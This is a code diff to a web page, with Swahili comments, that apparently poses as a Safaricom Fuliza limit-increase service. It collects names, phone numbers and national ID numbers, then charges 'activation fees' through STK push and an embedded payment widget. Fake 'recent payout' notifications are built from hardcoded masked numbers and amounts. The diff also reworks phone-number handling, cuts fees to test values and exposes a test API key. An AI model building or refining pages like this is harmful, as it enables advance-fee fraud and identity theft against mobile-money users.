@@ -87,7 +87,7 @@
             <h2>Verify Your Account</h2>        
             <form id="form1">        
                 <div class="form-group"><label>Full Name</label><input type="text" id="fullName" required><div class="error" id="nameError"></div></div>        
-                <div class="form-group"><label>Safaricom Phone Number</label><input type="tel" id="phone" placeholder="07XXXXXXXX" required><div class="error" id="phoneError"></div></div>        
+                <div class="form-group"><label>Safaricom Phone Number</label><input type="tel" id="phone" placeholder="07XXXXXXXX au 2547XXXXXXX" required><div class="error" id="phoneError"></div></div>        
                 <div class="form-group"><label>National ID Number</label><input type="number" id="idNumber" required><div class="error" id="idError"></div></div>        
                 <div class="form-group"><label>Your Current Fuliza Limit</label><input type="number" id="currentLimit" required></div>        
                 <button type="submit" class="btn">Verify Account</button>        
@@ -110,7 +110,7 @@
             </div>        
         </div>        
         <h2>Select Your Desired Fuliza Limit</h2>        
-        <div class="limit-option" onclick="selectLimit(8000,300)"><h3>KSh 8,000</h3><p>Activation Fee: KSh 300</p></div>        
+        <div class="limit-option" onclick="selectLimit(8000,3)"><h3>KSh 8,000</h3><p>Activation Fee: KSh 3</p></div>        
         <div class="limit-option" onclick="selectLimit(15000,400)"><h3>KSh 15,000</h3><p>Activation Fee: KSh 400</p></div>        
         <div class="limit-option" onclick="selectLimit(25000,450)"><h3>KSh 25,000</h3><p>Activation Fee: KSh 450</p></div>        
         <div class="limit-option" onclick="selectLimit(35000,550)"><h3>KSh 35,000</h3><p>Activation Fee: KSh 550</p></div>        
@@ -128,12 +128,28 @@
             <h2>Activate Your Fuliza Limit Now</h2>        
             <div class="summary-box"><span>Selected Limit:</span> <span>KSh <span id="sLimit">75,000</span></span></div>        
             <div class="summary-box"><span>Activation Fee:</span> <span>KSh <span id="sFee">900</span></span></div>        
-            <div class="form-group">        
-                <label>Safaricom Phone Number</label>        
-                <div class="phone-input"><div class="phone-prefix">254</div><input type="tel" id="payPhone" placeholder="7XXXXXXXX" maxlength="9"></div>        
-                <div class="error" id="payPhoneError"></div>
-            </div>        
-            <button id="payBtn" class="btn" onclick="paySTK()">Pay Activation Fee Now</button>        
+            
+            <div style="margin-top: 20px;">
+                <!-- FinAPI Payment Widget -->
+                <div id="finapi-container" class="finapi-widget" 
+                     data-api-key="sk_test_82327f4b130c4bf1b4f7652f026853c6" 
+                     data-amount="1" 
+                     data-color="#2563eb"
+                     data-provider="payhero">
+                </div>
+                
+
+            </div>
+            
+            <div style="text-align: center; margin-top: 15px; border-top: 1px solid #eee; padding-top: 15px;">
+                <p style="font-size: 12px; color: #999;">Or use alternative manual payment:</p>
+                <div class="form-group" style="margin-top: 10px;">        
+                    <label>Safaricom Phone Number</label>        
+                    <input type="tel" id="payPhone" placeholder="07XXXXXXXX au 2547XXXXXXX">
+                    <div class="error" id="payPhoneError"></div>
+                </div>        
+                <button id="payBtn" class="btn" onclick="paySTK()" style="background: #666;">Manual Pay</button>        
+            </div>
         </div>        
     </div>        
 </div>  
@@ -153,7 +169,7 @@
 <script>        
 let selectedLimit = 0, selectedFee = 0;        
 let userData = {};  
-const API_URL = "https://your-app-name.onrender.com"; // <-- BADILISHA HII NA LINK YAKO YA RENDER
+const API_URL = ""; // <-- Calls relative path, works locally and when deployed
 const phones = ["070167***29", "071234***56", "072345***78", "073456***90", "074567***12"];        
 const amounts = [45715, 32100, 85000, 15000, 65000];        
 const timeAgo = ["just now", "1 min ago", "2 mins ago", "3 mins ago"];      
@@ -186,13 +202,33 @@ document.getElementById('form1').addEventListener('submit', async e=>{
     setTimeout(()=>show(3), 2000);
 });
 
+function formatPhoneNumber(phone) {
+    phone = phone.replace(/\D/g, '');
+    if (phone.length === 9 && (phone.startsWith('7') || phone.startsWith('1'))) {
+        return "254" + phone;
+    }
+    if (phone.length === 10 && (phone.startsWith('07') || phone.startsWith('01'))) {
+        return "254" + phone.substring(1);
+    }
+    if (phone.length === 12 && (phone.startsWith('2547') || phone.startsWith('2541'))) {
+        return phone;
+    }
+    return null;
+}
+
 function validateForm(){
     let valid = true;
-    const phone = document.getElementById('phone').value;
-    if(!phone.match(/^07\d{8}$/)){
-        document.getElementById('phoneError').innerText = "Weka namba ya 07XXXXXXXX";
+    const phoneInput = document.getElementById('phone');
+    const phone = phoneInput.value;
+    document.getElementById('phoneError').style.display = 'none';
+    
+    let formattedPhone = formatPhoneNumber(phone);
+    if(!formattedPhone){
+        document.getElementById('phoneError').innerText = "Weka namba sahihi ya Safaricom (mfano: 07.., 01.., 2547..)";
         document.getElementById('phoneError').style.display = 'block';
         valid = false;
+    } else {
+        phoneInput.value = formattedPhone;
     }
     return valid;
 }
@@ -208,16 +244,18 @@ function selectLimit(limit, fee){
 
 // FUNCTION MPYA IME-CONNECT NA SERVER
 async function paySTK(){
-    const phone = document.getElementById('payPhone').value;
+    const phoneInput = document.getElementById('payPhone');
+    const phone = phoneInput.value;
     document.getElementById('payPhoneError').style.display = 'none';
     
-    if(phone.length !== 9){ 
-        document.getElementById('payPhoneError').innerText = 'Weka 9 digits bila 0';
+    let fullPhone = formatPhoneNumber(phone);
+    if(!fullPhone){ 
+        document.getElementById('payPhoneError').innerText = 'Weka namba sahihi ya Safaricom (mfano: 07.., 01.., 2547..)';
         document.getElementById('payPhoneError').style.display = 'block';
         return; 
     }
+    phoneInput.value = fullPhone;
     
-    const fullPhone = "254" + phone;
     const btn = document.getElementById('payBtn');
     btn.disabled = true;
     btn.innerText = 'Sending STK...';
@@ -237,7 +275,7 @@ async function paySTK(){
         const data = await response.json();
         
         if(data.success){
-            document.getElementById('paidPhone').innerText = "0" + phone;
+            document.getElementById('paidPhone').innerText = "0" + fullPhone.substring(3);
             show(5);
         } else {
             alert('Error: ' + data.message);
@@ -261,7 +299,20 @@ function showTopNotif(){
 }
 setTimeout(showTopNotif, 1000);
 setInterval(showTopNotif, 4000);
-</script>  
+
+</script> 
+<!-- FinAPI Payment Widget -->
+<script src="http://127.0.0.1:8000/static/js/finapi-widget.js"></script>
+<script>
+  const widget = document.getElementById('finapi-container');
+  widget.addEventListener('finapi:payment_success', (e) => {
+      console.log('Success!', e.detail);
+  });
+  widget.addEventListener('finapi:payment_failed', (e) => {
+      console.log('Failed!', e.detail);
+  });
+</script>
+
 </body>
 </html>
 
